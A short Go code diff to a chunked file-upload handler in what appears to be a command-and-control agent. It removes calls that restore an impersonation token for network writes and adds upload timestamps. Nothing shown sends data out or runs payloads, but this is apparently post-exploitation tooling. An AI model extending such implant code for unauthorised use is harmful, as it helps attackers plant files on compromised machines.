@@ -89,11 +89,6 @@ func HandleUploadChunk(cmd Command, ctx *CommandContext) (*CommandResult, error)
 		return nil, fmt.Errorf("no data in upload chunk")
 	}
 
-	// IMPORTANT: Ensure network-only token is active if uploading to network path
-	// This is crucial for chunks that come after sleep intervals where the
-	// thread impersonation token may have been lost
-	EnsureNetworkTokenForUpload(cmd.RemotePath)
-
 	// Decode chunk data
 	chunkData, err := base64.StdEncoding.DecodeString(cmd.Data)
 	if err != nil {
@@ -103,18 +98,22 @@ func HandleUploadChunk(cmd Command, ctx *CommandContext) (*CommandResult, error)
 	// Get or create upload info
 	commandQueue.mu.Lock()
 	uploadInfo, exists := commandQueue.activeUploads[cmd.Filename]
+	now := time.Now()
 	if !exists {
 		uploadInfo = &UploadInfo{
 			Chunks:      make(map[int][]byte),
 			TotalChunks: cmd.TotalChunks,
 			RemotePath:  cmd.RemotePath,
 			Filename:    cmd.Filename,
+			StartTime:   now,
+			LastUpdate:  now,
 		}
 		commandQueue.activeUploads[cmd.Filename] = uploadInfo
 	}
 
-	// Store chunk in memory
+	// Store chunk in memory and update last activity time
 	uploadInfo.Chunks[cmd.CurrentChunk] = chunkData
+	uploadInfo.LastUpdate = now
 	commandQueue.mu.Unlock()
 
 	// Check if this was the last chunk
@@ -134,9 +133,6 @@ func HandleUploadChunk(cmd Command, ctx *CommandContext) (*CommandResult, error)
 
 		// Convert to OS-specific path format and clean
 		finalPath = filepath.FromSlash(filepath.Clean(finalPath))
-
-		// Ensure network token is active for final write operations
-		EnsureNetworkTokenForUpload(finalPath)
 
 		// Create parent directories if needed
 		// Use NetworkAwareMkdirAll instead of os.MkdirAll
@@ -173,8 +169,6 @@ func HandleUploadChunk(cmd Command, ctx *CommandContext) (*CommandResult, error)
 
 // assembleAndWriteFile function from action_upload.go
 func assembleAndWriteFile(info *UploadInfo, finalPath string) error {
-	// Ensure network token is active for file assembly
-	EnsureNetworkTokenForUpload(finalPath)
 
 	// Create final file
 	// Use NetworkAwareOpenFile instead of os.Create
